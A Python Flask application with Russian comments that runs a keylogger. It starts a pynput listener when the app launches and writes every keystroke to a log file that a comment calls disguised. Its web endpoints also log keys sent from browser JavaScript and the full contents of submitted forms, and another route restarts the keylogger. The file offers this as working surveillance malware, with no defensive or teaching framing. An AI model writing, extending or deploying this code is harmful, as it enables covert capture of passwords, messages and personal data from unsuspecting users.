from flask import Flask, render_template, request, jsonify
import threading
import logging
from pynput.keyboard import Key, Listener
import os
import time

app = Flask(__name__)

# Создаем директорию для логов (если её нет)
if not os.path.exists("keylogs"):
    os.makedirs("keylogs")

# Замаскированное имя файла и путь к лог-файлу
log_file = os.path.join("keylogs", f"keylog_{int(time.time())}.txt")

# Настройка логирования для захвата нажатий клавиш
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Функция для захвата нажатий клавиш
def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

def on_release(key):
    if key == Key.esc:
        logging.info("Escape key pressed. Exiting...")
        return False  # Останавливает кейлоггер

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Глобальная переменная для хранения потока кейлоггера
keylogger_thread = None

# Функция для перезапуска кейлоггера
def restart_keylogger():
    global keylogger_thread
    if keylogger_thread and keylogger_thread.is_alive():
        keylogger_thread.join()  # Ожидаем завершения предыдущего потока
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

# Запуск кейлоггера при старте приложения
restart_keylogger()

# Маршрут для отображения главной страницы
@app.route('/')
def index():
    return render_template('index.html')  # Рендерим index.html из папки templates

# Обработка данных с JS
@app.route('/log-keys', methods=['POST'])
def log_keys():
    data = request.json
    key = data.get('key')
    logging.info(f"JS Key pressed: {key}")
    return jsonify({"status": "success"})

@app.route('/submit-form', methods=['POST'])
def submit_form():
    form_data = request.form
    logging.info(f"Form submitted: {form_data}")
    return jsonify({"status": "success"})

# Маршрут для перезапуска кейлоггера
@app.route('/restart-keylogger', methods=['GET'])
def restart_keylogger_route():
    restart_keylogger()
    return jsonify({"status": "success", "message": "Keylogger restarted"})

if __name__ == '__main__':
    app.run(debug=True, port=5001)  # Используйте другой порт, если 5000 занят